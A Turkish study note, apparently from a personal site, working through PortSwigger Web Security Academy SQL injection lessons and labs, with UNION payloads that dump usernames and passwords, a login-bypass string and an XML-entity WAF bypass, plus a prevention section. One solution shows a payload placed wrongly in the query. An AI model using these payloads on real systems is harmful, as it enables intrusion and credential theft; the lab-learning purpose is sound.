---
{"dg-publish":true,"permalink":"/portswigger/sql-injection/","created":"2024-12-12T13:23:52.815+03:00","updated":"2025-03-31T00:53:16.508+03:00"}
---

### **SQL Injection Tespiti**

SQL injection zafiyetlerini **manuel olarak** tespit etmek için:

- **Tek tırnak (`'`)** ile hata veya anomali kontrolü
- **Mantıksal koşullar** (`OR 1=1`, `OR 1=2`) ile yanıt farklarını analiz etme
- **Zaman gecikmeli payloadlar** (`SLEEP(5)`, `WAITFOR DELAY '0:0:5'`) ile tepki süresini ölçme
- **OAST payloadları** ile ağ etkileşimi olup olmadığını test etme


### **SQL Injection Farklı Sorgu Bölgelerinde**

SQL injection zafiyetleri genellikle **`SELECT` sorgularının `WHERE`** koşulunda ortaya çıkar. Ancak, **farklı sorgu türlerinde ve konumlarda** da meydana gelebilir:

- **`UPDATE` sorgularında**, güncellenen değerler veya `WHERE` koşulunda
- **`INSERT` sorgularında**, eklenen veriler içinde
- **`SELECT` sorgularında**, tablo veya kolon adlarında
- **`SELECT` sorgularında**, **`ORDER BY`** ifadesinde

### Gizli Verileri Elde Etme

Bir alışveriş uygulamasının, ürünleri farklı kategorilerde listelediğini düşünelim. Kullanıcı **`Gifts`** kategorisine tıkladığında, tarayıcısı şu URL’yi talep eder:

```
https://insecure-website.com/products?category=Gifts
```

Bu istek, veritabanından ilgili ürünleri almak için şu **SQL sorgusunu** çalıştırır:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Bu **SQL sorgusu**, veritabanından şu verileri döndürmesini ister:

- **Tüm detaylar** (`*`)
- **`products`** tablosundan
- **`category`** değeri **`Gifts`** olan kayıtlar
- **`released`** değeri **1** olan kayıtlar

Burada **released = 1** koşulu, henüz yayınlanmamış ürünleri gizlemek için kullanılır. Muhtemelen yayınlanmamış ürünlerde **released = 0** değeri bulunmaktadır.

Uygulama, **SQL injection** saldırılarına karşı herhangi bir koruma sağlamıyorsa, bir saldırgan aşağıdaki gibi bir saldırı gerçekleştirebilir:

```
https://insecure-website.com/products?category=Gifts'--
```

Bu durumda çalıştırılan **SQL sorgusu** şu hale gelir:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Burada **`--`** karakterinin **SQL'de yorum satırı** olduğunu unutmayalım. Bu, **AND released = 1** kısmının yorum olarak algılanmasına ve sorgudan çıkarılmasına neden olur. Sonuç olarak **tüm ürünler**, yayınlanmamış olanlar da dahil olmak üzere, görüntülenir.

Yani kod şu şekilde çalışır . 

```
SELECT * FROM products WHERE category = 'Gifts'
```


### Tüm Product'ları Görüntüleme

Benzer bir saldırı ile **tüm kategorilerdeki ürünleri** görüntülemek mümkündür. Örneğin:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Bu, şu **SQL sorgusuna** dönüşür:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Bu sorgu, şu durumlarda sonuç döndürür:

1. **`category`** değeri **`Gifts`** ise
2. **`1=1`** ifadesi her zaman **`true`** olduğu için **tüm product'lar döndürülür**

Sonuç olarak, saldırgan, tüm kategorilerdeki ürünleri, hatta normalde erişiminin olmadığı kategorileri bile görüntüleyebilir.


### **Uyarı**

Bir **SQL sorgusuna** `OR 1=1` koşulu **inject** ederken dikkatli olun. **Inject** ettiğiniz bağlamda zararsız görünebilir, ancak birçok uygulama **tek bir request içindeki veriyi birden fazla sorguda kullanır**.

Eğer bu koşul bir **UPDATE** veya **DELETE** sorgusuna ulaşırsa, **verilerin yanlışlıkla silinmesine veya değiştirilmesine** neden olabilir.

---
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Bu laboratuvar, `product` `category` filtresinde bir SQL injection güvenlik açığı içermektedir. Kullanıcı bir `category` seçtiğinde, uygulama aşağıdaki gibi bir SQL sorgusu gerçekleştirir:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Laboratuvarı çözmek için, uygulamanın bir veya daha fazla yayınlanmamış (unreleased) product'u görüntülemesine neden olan bir SQL injection saldırısı gerçekleştirin.

Çözüm : 

1- Sorguya `'+OR+1=1--` şeklinde bir input girersek, **backend**'de şu **SQL sorgusu** çalışır:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1'+OR+1=1--
```

Yani `"Gifts"` **category**sindeki ve yayımlanmış olmayan tüm **product**ları da dahil olmak üzere **tüm product**ları döndüren bir sorguya dönüşüyor.

![Pasted image 20250329015841.png](/img/user/resimler/Pasted%20image%2020250329015841.png)

---

### Subverting application logic

Bir **application**, kullanıcı adı ve şifre ile giriş yapılmasına izin veriyor. Eğer bir kullanıcı `"wiener"` **username**'ini ve `"bluecheese"` **password**'ünü girerse, **application** kimlik bilgilerini doğrulamak için şu SQL sorgusunu çalıştırır:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Eğer sorgu bir **user**'a ait bilgileri döndürürse giriş başarılı olur, aksi takdirde reddedilir.

Bu durumda, bir **attacker**, herhangi bir **user** olarak şifre gerekmeksizin giriş yapabilir. Bunu, SQL'de yorum satırı başlatan `--` dizisini kullanarak **WHERE** koşulundaki **password** kontrolünü kaldırarak yapabilir. Örneğin, `"administrator'--"` **username**'i ve boş bir **password** girilirse şu SQL sorgusu çalıştırılır:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Bu sorgu `"administrator"` **username**'ine sahip **user**'ı döndürür ve **attacker**'ın o **user** olarak başarılı bir şekilde giriş yapmasını sağlar.

Tam olarak aşağıdaki kod database'e iletilir. 

```
SELECT * FROM users WHERE username = 'administrator'
```

---
### Lab: SQL injection vulnerability allowing login bypass

Bu laboratuvar, login fonksiyonunda bir SQL injection güvenlik açığı içermektedir .

Laboratuvarı çözmek için, uygulamada `administrator` kullanıcısı olarak login olan bir SQL injection saldırısı gerçekleştirin.

Çözüm : 

1- Username formuna `administrator'--`  yazıyoruz. 

![Pasted image 20250329020138.png](/img/user/resimler/Pasted%20image%2020250329020138.png)

----
### Diğer veritabanı tablolarından veri alma

Uygulama, bir SQL sorgusunun sonuçları ile yanıt verdiğinde, bir **attacker** SQL enjeksiyonu açığını kullanarak veritabanındaki diğer tablolardan veri alabilir. **`UNION`** anahtar kelimesini kullanarak ek bir **`SELECT`** sorgusu çalıştırabilir ve sonuçları orijinal sorguya ekleyebilir.

Örneğin, bir uygulama aşağıdaki sorguyu çalıştırıyorsa, kullanıcı girdisi olarak **`Gifts`**:

```
SELECT name, description FROM products WHERE category = 'Gifts'
```

Bir **attacker**, şu input'u gönderebilir:

```
' UNION SELECT username, password FROM users--
```

Bu, uygulamanın **username** ve **password** bilgilerini de **product**'ların **name** ve **description** bilgileri ile birlikte döndürmesine yol açar.

`UNION SQL injection` konusunda bunu ayrıntılı olarak inceleyeceğiz.

---

### Blind SQL injection vulnerabilities

SQL **injection**'ının birçok örneği **blind** açıklarındandır. Bu, uygulamanın SQL sorgusunun sonuçlarını veya veritabanı hatalarının detaylarını yanıtlarında döndürmediği anlamına gelir. **Blind** açıklar hala yetkisiz verilere erişmek için kullanılabilir, ancak bu tür açıkları kullanmak genellikle daha karmaşık ve zorlayıcıdır.

Aşağıdaki teknikler, **blind SQL injection** açıklarını **exploit** etmek için kullanılabilir, kullanılan açıkların türüne ve veritabanına bağlı olarak:

- Sorgunun mantığını değiştirebilir ve uygulamanın yanıtında tek bir koşulun doğru olup olmadığına bağlı olarak fark edilebilir bir değişiklik tetikleyebilirsiniz. Bu, bazı **Boolean** mantığına yeni bir koşul enjekte etmek veya sıfıra bölme gibi bir hatayı koşullu olarak tetiklemeyi içerebilir.
    
- Sorgunun işlenmesinde bir zaman gecikmesi tetikleyebilirsiniz. Bu, koşulun doğruluğunu, uygulamanın yanıt verme süresine göre çıkarabilmenizi sağlar.
    
- **`OAST`** tekniklerini kullanarak, bir dışa veri sızdırma (**`out-of-band`**) ağ etkileşimi tetikleyebilirsiniz. Bu teknik son derece güçlüdür ve diğer tekniklerin çalışmadığı durumlarda işe yarar. Çoğu zaman, veriyi doğrudan dışa veri kanalı aracılığıyla sızdırabilirsiniz. Örneğin, veriyi kontrol ettiğiniz bir alan adı için yapılan bir **DNS** sorgusuna yerleştirebilirsiniz.

Blind SQL injection  konusunda ayrıntılı olarak işleyeceğiz. 


### Second-order SQL injection

**`First-order SQL injection`**, uygulamanın HTTP isteğinden gelen kullanıcı input'unu işleyip, bu _input_'u SQL sorgusuna güvensiz bir şekilde dahil etmesiyle meydana gelir.

**`Second-order SQL injection`** ise, uygulamanın HTTP isteğinden gelen kullanıcı input'unu alıp, gelecekte kullanılmak üzere saklamasıyla gerçekleşir. Bu genellikle veriyi bir veritabanına yerleştirerek yapılır, ancak verinin saklandığı noktada herhangi bir açıklık oluşmaz. Daha sonra, farklı bir HTTP isteği işlenirken, uygulama saklanan veriyi alır ve bunu güvensiz bir şekilde bir SQL sorgusuna dahil eder. Bu nedenle, ikinci dereceden SQL injection aynı zamanda saklanmış SQL injection olarak da bilinir.

![Pasted image 20250329145647.png](/img/user/resimler/Pasted%20image%2020250329145647.png)
Second-order SQL injection genellikle geliştiricilerin SQL injection açıklıklarının farkında olduğu ve bu nedenle input'un veritabanına ilk yerleştirilmesinde güvenli bir şekilde işlem yaptıkları durumlarda meydana gelir. Veriler daha sonra işlenirken, önce veritabanına güvenli bir şekilde yerleştirildikleri için güvenli olarak kabul edilir. Ancak bu noktada veriler güvensiz bir şekilde işlenir, çünkü geliştirici bu verileri yanlış bir şekilde güvenilir olarak kabul eder.


### Veritabanının incelenmesi

SQL dilinin bazı temel özellikleri, popüler veritabanı platformlarında aynı şekilde uygulanır, bu nedenle SQL injection açıklıklarını tespit etme ve istismar etme yöntemlerinin çoğu farklı veritabanı türlerinde aynı şekilde çalışır.

Ancak, yaygın veritabanları arasında birçok fark da bulunmaktadır. Bu farklar, bazı tespit etme ve SQL injection istismar tekniklerinin farklı platformlarda farklı şekilde çalışmasına neden olur. Örneğin:

- _String concatenation_ (dize birleştirme) sözdizimi.
- Yorumlar (_comments_).
- Birleştirilmiş (veya yığılan) sorgular (_batched_ ya da _stacked queries_).
- Platforma özgü API'ler (_platform-specific APIs_).
- Hata mesajları (_error messages_).

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

SQL injection açıklığı tespit ettikten sonra, veritabanı hakkında bilgi almak faydalı olabilir. Bu bilgiler, açıklığı istismar etmek için yardımcı olabilir.

Veritabanı sürüm detaylarını sorgulayabilirsiniz. Farklı veritabanı türleri için farklı yöntemler çalışır. Bu, belirli bir yöntemin işe yaradığını bulduğunuzda, veritabanı türünü çıkarabileceğiniz anlamına gelir. Örneğin, Oracle üzerinde şu sorguyu çalıştırabilirsiniz:

```
SELECT * FROM v$version
```

Ayrıca, hangi veritabanı tablolarının mevcut olduğunu ve hangi sütunları içerdiğini de tespit edebilirsiniz. Örneğin, çoğu veritabanında tabloları listelemek için aşağıdaki sorguyu çalıştırabilirsiniz:

```
SELECT * FROM information_schema.tables
```


### Farklı context'lerde SQL injection

Önceki laboratuvarlarda, malicious SQL payload’unuzu enjekte etmek için query string’i kullandınız. Ancak, SQL injection saldırıları, uygulama tarafından SQL query’si olarak işlenen herhangi bir kontrol edilebilir input kullanılarak da gerçekleştirilebilir. Örneğin, bazı web siteleri JSON veya XML formatında input alır ve bunu veritabanına query yapmak için kullanır.

Bu farklı formatlar, WAF’lar ve diğer savunma mekanizmaları tarafından engellenen saldırıları gizlemek için farklı yollar sağlayabilir. Zayıf uygulamalar genellikle istekteki yaygın SQL injection anahtar kelimelerini arar, bu nedenle yasaklanmış anahtar kelimelerdeki karakterleri encode ederek veya escape sequence kullanarak bu filtreleri aşmanız mümkün olabilir. Örneğin, aşağıdaki XML tabanlı SQL injection, SELECT içindeki S karakterini encode etmek için bir XML escape sequence kullanır:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Bu, SQL yorumlayıcısına gönderilmeden önce sunucu tarafında çözümlenecektir.

---
### Lab: SQL injection with filter bypass via XML encoding

Bu laboratuvar, `stock` kontrol özelliğinde bir SQL injection açığı içeriyor. Query sonuçları uygulamanın yanıtında döndürüldüğü için, diğer tablolardan veri almak için bir `UNION` saldırısı kullanabilirsiniz.

Veritabanında, kayıtlı kullanıcıların `kullanıcı adı` ve `şifrelerini` içeren bir `users` tablosu bulunmaktadır. Laboratuvarı çözmek için, `admin` kullanıcısının kimlik bilgilerini almak amacıyla bir SQL injection saldırısı gerçekleştirin ve ardından bu kullanıcı hesabına giriş yapın.

Çözüm : 

1- Check stock butonuna tıkladığımızda ve Burp'ten request'i yakaladığımızda, görüldüğü gibi request XML formatında gönderildiği görüntülenmektedir.

![Pasted image 20250329152035.png](/img/user/resimler/Pasted%20image%2020250329152035.png)

2- **Burp Repeater**'da **`storeId`**'yi test ederek input'un değerlendirilip değerlendirilmediğini kontrol edin. Örneğin, ID'yi başka potansiyel ID'lere dönüşen matematiksel ifadelerle değiştirin, örneğin:

```
<storeId>1+1</storeId>
```

![Pasted image 20250329152438.png](/img/user/resimler/Pasted%20image%2020250329152438.png)

![Pasted image 20250329152424.png](/img/user/resimler/Pasted%20image%2020250329152424.png)

İnputunuzun uygulama tarafından değerlendirildiğini gözlemleyin, farklı mağazaların stok bilgilerini döndürüyor.

Orijinal sorgunun döndürdüğü column sayısını belirlemeye çalışın, orijinal **`storeId`**'ye bir **`UNION SELECT`** ifadesi ekleyerek:

```
<storeId>1 UNION SELECT NULL</storeId>
```

Request'inizin potansiyel bir saldırı olarak işaretlenmesi nedeniyle engellendiğini gözlemleyin.

![Pasted image 20250329152905.png](/img/user/resimler/Pasted%20image%2020250329152905.png)

**XML**'ye inject ettiğiniz için, payload'ı **XML** entity'lerini kullanarak obfiske etmeyi deneyin. Bunu yapmanın bir yolu, **Hackvertor** extension'ını kullanmaktır. İnput'unuzu vurgulayın, sağ tıklayın, ardından **`Extensions` > `Hackvertor` > `Encode` > `dec_entities/hex_entities`** seçeneğini tıklayın.

Request'i tekrar gönderin ve şimdi uygulamadan normal bir response aldığınızı fark edin. Bu, **WAF**'ı başarılı bir şekilde atlattığınızı gösterir.

![Pasted image 20250329153628.png](/img/user/resimler/Pasted%20image%2020250329153628.png)

![Pasted image 20250329153639.png](/img/user/resimler/Pasted%20image%2020250329153639.png)

Konuya kaldığınız yerden devam edin ve sorgunun tek bir column döndürdüğünü çıkarın. Birden fazla column döndürmeye çalıştığınızda, uygulama `0` birim döndürüyor, bu da bir hata olduğunu ima ediyor.

```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

Bu sorguyu gönderin ve kullanıcı adı ve şifrelerin `~` karakteri ile ayrıldığını gözlemleyin.

![Pasted image 20250329153948.png](/img/user/resimler/Pasted%20image%2020250329153948.png)

![Pasted image 20250329154035.png](/img/user/resimler/Pasted%20image%2020250329154035.png)


---

### SQL Injection'ı Önleme

Query içinde string concatenation yerine parametrelendirilmiş query'ler kullanarak SQL injection'ın çoğu örneğini önleyebilirsiniz. Bu parametrelendirilmiş sorgular “ prepared statements (hazır deyimler)" olarak da bilinir.

Aşağıdaki kod, user input (kullanıcı girdisi) doğrudan query'de birleştirildiği için SQL enjeksiyonuna karşı savunmasızdır:

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Bu kodu, user input'un query yapısına müdahale etmesini engelleyecek şekilde yeniden yazabilirsiniz:

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Parametrelendirilmiş sorguları, `WHERE` cümlesi ve `INSERT` veya `UPDATE` deyimindeki değerler dahil olmak üzere, güvenilmeyen inputun query içinde veri olarak göründüğü her durum için kullanabilirsiniz. Tablo veya sütun adları ya da `ORDER BY` cümlesi gibi sorgunun diğer bölümlerindeki güvenilmeyen inputları işlemek için kullanılamazlar. Güvenilmeyen verileri sorgunun bu bölümlerine yerleştiren uygulama işlevselliğinin farklı bir yaklaşım benimsemesi gerekir, örneğin:

* İzin verilen input değerlerini whitelist yapmak.
* Gerekli davranışı sağlamak için farklı mantık kullanma.

Parametrelendirilmiş bir sorgunun SQL enjeksiyonunu önlemede etkili olabilmesi için sorguda kullanılan string her zaman hard-coded bir constant olmalıdır. Hiçbir zaman herhangi bir kaynaktan gelen değişken veri içermemelidir. Bir veri öğesinin güvenilir olup olmadığına duruma göre karar verme eğiliminde olmayın ve güvenli olduğu düşünülen durumlar için query içinde string concatenation kullanmaya devam edin. Verilerin olası kaynağı hakkında hata yapmak veya diğer kodlardaki değişikliklerin güvenilir verileri bozması kolaydır.

- [Find SQL injection vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)


### SQL enjeksiyon saldırılarında veritabanının incelenmesi

SQL injection güvenlik açıklarından yararlanmak için genellikle veritabanı hakkında bilgi bulmak gerekir. Bu bilgiler şunları içerir:

* Veritabanı yazılımının türü ve version .
* Veritabanının içerdiği tables ve columns .


### Veritabanı version'unu ve türünü sorgulama

Veritabanı türünü ve versiyonunu, provider'a özel sorgular enjekte ederek potansiyel olarak belirleyebilirsiniz. Aşağıda, bazı popüler veritabanı türleri için veritabanı versiyonunu belirlemek amacıyla kullanılabilecek bazı sorgular verilmiştir:

|**Veritabanı Türü**|**Sorgu**|
|---|---|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

Örneğin, aşağıdaki gibi bir **UNION** saldırısı kullanarak:

```
' UNION SELECT @@version--
```

Bu query şu tür bir outpu döndürebilir. Bu durumda, veritabanının **Microsoft SQL Server** olduğunu ve kullanılan sürümü görebilirsiniz:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

---

### Lab: SQL injection saldırısı, Oracle'da veritabanı türünü ve versiyonunu sorgulama

Bu laboratuvar, product category filtresinde bir SQL injection güvenlik açığı içerir. Enjekte edilen bir sorgudan sonuçları almak için bir UNION saldırısı kullanabilirsiniz.

Laboratuvarı çözmek için veritabanı versiyonunu gösteren string'i görüntüleyin.


Çözüm : 

Sorgu tarafından döndürülen column sayısını ve hangi columnların text verisi içerdiğini belirleyin. `Category` parametresinde aşağıdaki gibi bir payload kullanarak sorgunun her ikisi de text içeren iki column döndürdüğünü doğrulayın:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

- **`SELECT 'abc','def'`**: Bu, `UNION` ile birleştirilen sorgudur. Burada `'abc'` ve `'def'` sabit metinlerdir. Bu, veritabanından dönen veri kümesinde iki kolon (column) olduğunu varsayar ve her iki kolon için sırasıyla `'abc'` ve `'def'` değerlerini döndüren bir sorgudur.

- **`FROM dual`**: `dual` bir sanal tabloyu ifade eder. Oracle veritabanlarında kullanılan özel bir tablodur ve genellikle sadece tek bir satır döndürmek için kullanılır. Bu örnekte, `dual` tablosu, sorgunun yalnızca sabit metinleri döndürmesini sağlar.

![Pasted image 20250329161032.png](/img/user/resimler/Pasted%20image%2020250329161032.png)

Veritabanı versiyonunu görüntülemek için aşağıdaki payload'u kullanın:

```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

![Pasted image 20250329161057.png](/img/user/resimler/Pasted%20image%2020250329161057.png)

---

### Lab: SQL injection saldırısı, MySQL ve Microsoft'ta veritabanı türünü ve versiyonunu sorgulama

Bu laboratuvar, product category filtresinde bir SQL injection güvenlik açığı içerir. Enjekte edilen bir sorgudan sonuçları almak için bir UNION saldırısı kullanabilirsiniz.

Laboratuvarı çözmek için veritabanı versiyon stringini görüntüleyin.

Çözüm : 

Burp Suite'i kullanarak, **category** filtresini ayarlayan **request**'i yakalayın ve değiştirin. **query**'nin döndürdüğü **column** sayısını ve hangi **column**'ların metin verisi içerdiğini belirleyin. **category** parametresine aşağıdaki **payload**'ı kullanarak, **query**'nin iki **column** döndürdüğünü ve her ikisinin de metin içerdiğini doğrulayın:

```
'+UNION+SELECT+'abc','def'#
```

![Pasted image 20250329162945.png](/img/user/resimler/Pasted%20image%2020250329162945.png)

Veritabanı versiyonu görüntülemek için aşağıdaki **payload**'ı kullanın:

![Pasted image 20250329163028.png](/img/user/resimler/Pasted%20image%2020250329163028.png)


### Veritabanının içeriğini listeleme

Çoğu veritabanı türü (**Oracle hariç**), veritabanı hakkında bilgi sağlayan **information schema** adlı bir dizi **view** içerir.

Örneğin, veritabanındaki **table**'ları listelemek için `information_schema.tables` sorgulanabilir:

```
SELECT * FROM information_schema.tables
```

Bu sorgunun çıktısı aşağıdaki gibi olabilir:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Bu çıktı, veritabanında **Products**, **Users** ve **Feedback** adında üç **table** bulunduğunu gösterir.

Belirli bir **table** içindeki **column**'ları listelemek için `information_schema.columns` sorgulanabilir:

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Bu sorgunun çıktısı şu şekilde olabilir:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Bu çıktı, belirtilen **table**'daki **column**'ları ve her bir **column**'ın **data type**'ını gösterir.

---

## Lab: Oracle dışı veritabanlarında veritabanı içeriğini listeleyen SQL enjeksiyon saldırısı

Bu laboratuvar, product category filtresinde bir SQL injection güvenlik açığı içerir. Sorgudan elde edilen sonuçlar uygulamanın response'undan döndürülür, böylece diğer tablolardan veri almak için bir UNION saldırısı kullanabilirsiniz.

Uygulamanın bir login fonksiyonu vardır ve veritabanı kullanıcı adlarını ve parolaları tutan bir tablo içerir. Bu tablonun adını ve içerdiği column'ları belirlemeniz, ardından tüm kullanıcıların kullanıcı adı ve parolalarını elde etmek için tablonun içeriğini almanız gerekir.

Laboratuvarı çözmek için administrator kullanıcısı olarak oturum açın.

1. Geri Dönen Column Sayısını ve Veri Türünü Belirleme

**Query**'nin kaç **column** döndürdüğünü ve hangi **column**'ların **text** veri içerdiğini belirleyin. **Query**'nin iki **column** döndürdüğünü ve ikisinin de **text** veri içerdiğini doğrulamak için aşağıdaki **payload**'ı **category** parametresine enjekte edin:

```
'+UNION+SELECT+'abc','def'--
```

![Pasted image 20250329195841.png](/img/user/resimler/Pasted%20image%2020250329195841.png)

2. Veritabanındaki Table'ları Listeleme

Veritabanındaki **table**'ları listelemek için şu **payload**'ı kullanın:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

![Pasted image 20250329195908.png](/img/user/resimler/Pasted%20image%2020250329195908.png)

3. Kullanıcı Bilgilerini İçeren Table'ı Bulma

Veritabanında kullanıcı bilgilerini içeren **table**'ın adını belirleyin.

4. Kullanıcı Table'ındaki Column'ları Listeleme

Belirlenen **table** içindeki **column**'ları listelemek için şu **payload**'ı kullanın (**table_name** kısmını bulduğunuz isimle değiştirin):

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

`users_finwnz`

![Pasted image 20250329200158.png](/img/user/resimler/Pasted%20image%2020250329200158.png)

5. Kullanıcı Adlarını ve Şifrelerini Çekme

Kullanıcı adlarını ve şifreleri içeren **column** isimlerini belirleyin. Daha sonra aşağıdaki **payload**'ı kullanarak tüm kullanıcıların **username** ve **password** bilgilerini çekin (**table** ve **column** isimlerini değiştirmeyi unutmayın):

```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

![Pasted image 20250329200413.png](/img/user/resimler/Pasted%20image%2020250329200413.png)

6. Administrator Kullanıcısının Şifresini Bulma ve Giriş Yapma

![Pasted image 20250329200455.png](/img/user/resimler/Pasted%20image%2020250329200455.png)

---

### Oracle Veritabanının İçeriğini Listeleme

Oracle veritabanında, aşağıdaki **query**'leri kullanarak aynı bilgileri elde edebilirsiniz:

1. Table'ları Listeleme

Veritabanındaki **table**'ları listelemek için aşağıdaki **query**'yi çalıştırın:

```
SELECT * FROM all_tables;
```

2. Column'ları Listeleme

Belirli bir **table** içindeki **column**'ları listelemek için aşağıdaki **query**'yi kullanın (**table_name** kısmını değiştirmeyi unutmayın):

```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS';
```

---

### Lab: SQL injection saldırısı, Oracle'da veritabanı içeriğinin listelenmesi

Bu laboratuvar, product category filtresinde bir SQL injection güvenlik açığı içerir. Sorgudan elde edilen sonuçlar uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için bir UNION saldırısı kullanabilirsiniz.

Uygulamanın bir login fonksiyonu vardır ve veritabanı kullanıcı adlarını ve parolaları tutan bir tablo içerir. Bu tablonun adını ve içerdiği sütunları belirlemeniz, ardından tüm kullanıcıların kullanıcı adı ve parolalarını elde etmek için tablonun içeriğini almanız gerekir.

Laboratuvarı çözmek için administrator kullanıcısı olarak oturum açın.

Çözüm : 

1. Column Sayısını ve Veri Türlerini Belirleme

**Query**'nin kaç **column** döndürdüğünü ve hangi **column**'ların **text** veri içerdiğini belirleyin. İki **text column** döndüğünü doğrulamak için **category** parametresine şu **payload**'ı enjekte edin:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

![Pasted image 20250329202040.png](/img/user/resimler/Pasted%20image%2020250329202040.png)

2. Veritabanındaki Table'ları Listeleme

Veritabanındaki **table**'ları görmek için aşağıdaki **payload**'ı kullanın:

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

![Pasted image 20250329202059.png](/img/user/resimler/Pasted%20image%2020250329202059.png)

3. Kullanıcı Bilgilerini İçeren Table'ı Bulma

Kullanıcı kimlik bilgilerini içeren **table**'ın adını belirleyin.

4. Table İçindeki Column'ları Listeleme

Aşağıdaki **payload**'ı kullanarak belirlediğiniz **table** içindeki **column**'ları listeleyin (**table_name** değerini değiştirin):

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

![Pasted image 20250329202207.png](/img/user/resimler/Pasted%20image%2020250329202207.png)

5. Kullanıcı Adlarını ve Şifreleri İçeren Column'ları Bulma

Kullanıcı adlarını ve şifreleri içeren **column**'ları belirleyin.

6. Tüm Kullanıcı Adlarını ve Şifreleri Çekme

Kullanıcı adlarını ve şifreleri almak için aşağıdaki **payload**'ı kullanın (**table_name** ve **column** isimlerini değiştirin):

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

![Pasted image 20250329202320.png](/img/user/resimler/Pasted%20image%2020250329202320.png)

7. Admin Kullanıcısının Şifresini Bulma ve Giriş Yapma

---

### SQL injection UNION attacks

Bir uygulama **SQL injection**'a karşı savunmasız olduğunda ve **query** sonuçları uygulamanın **response**'larında döndüğünde, başka **table**'lardaki verileri almak için **UNION** kelimesini kullanabilirsiniz. Bu teknik genellikle **SQL injection UNION attack** olarak bilinir.

**UNION** kelimesi, bir veya daha fazla ek **SELECT query** çalıştırmanıza ve sonuçları orijinal **query**'nin çıktısına eklemenize olanak tanır. Örneğin:

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Bu **SQL query**, tek bir **result set** döndürerek **`table1`** içindeki **`a`** ve **`b`** sütunlarının, **table2** içindeki **`c`** ve **`d`** sütunlarının değerlerini içerir.

Bir **UNION query**'nin çalışması için iki temel gereksinim karşılanmalıdır:

* **Bireysel query**'lerin aynı sayıda **column** döndürmesi gerekir.
* Her **column**'daki **data type**, bireysel **query**'ler arasında uyumlu olmalıdır.

Bir **SQL injection UNION attack** gerçekleştirmek için saldırının bu iki gereksinimi karşıladığından emin olun. Bu genellikle şu bilgileri belirlemeyi içerir:

- Orijinal **query**'nin kaç **column** döndürdüğü.
- Orijinal **query** tarafından döndürülen hangi **column**'ların, enjekte edilen **query**'nin sonuçlarını alabilecek uygun **data type**'a sahip olduğu.

### Gerekli column sayısını belirleme

Bir **SQL injection UNION attack** gerçekleştirirken, orijinal **query**'nin kaç **column** döndürdüğünü belirlemek için iki etkili yöntem vardır.

Bir yöntem, artan sıralarla **`ORDER BY`** kullanarak **column index**'ini artırmak ve hata oluşana kadar denemektir. Örneğin, eğer **injection point**, orijinal **query**'nin **`WHERE` clause**'unda bulunan bir **quoted string** ise, şu şekilde gönderim yapabilirsiniz:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Bu **payload** serisi, orijinal **query**'yi değiştirerek sonuçları farklı **column**'lara göre sıralar. **`ORDER BY`** içinde belirtilen **column**, indeks numarasıyla belirtilebilir, bu yüzden **column** isimlerini bilmenize gerek yoktur.

Belirtilen **column index**, gerçek sonuç kümesindeki **column** sayısını aştığında, veritabanı bir hata döndürür, örneğin:

```
ORDER BY konum numarası 3, SELECT listesinde bulunan öğe sayısının dışında.
```

Uygulama, veritabanı hatasını HTTP yanıtında döndürebilir, ancak bunun yerine genel bir hata yanıtı da verebilir. Bazı durumlarda ise hiç sonuç döndürmeyebilir. Her durumda, yanıt içinde bir farklılık tespit edebildiğiniz sürece, sorgudan kaç **column** döndürüldüğünü çıkarabilirsiniz.

İkinci yöntem, farklı sayıda **NULL** değerleri içeren **`UNION SELECT`** payload'larını göndermeyi içerir:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
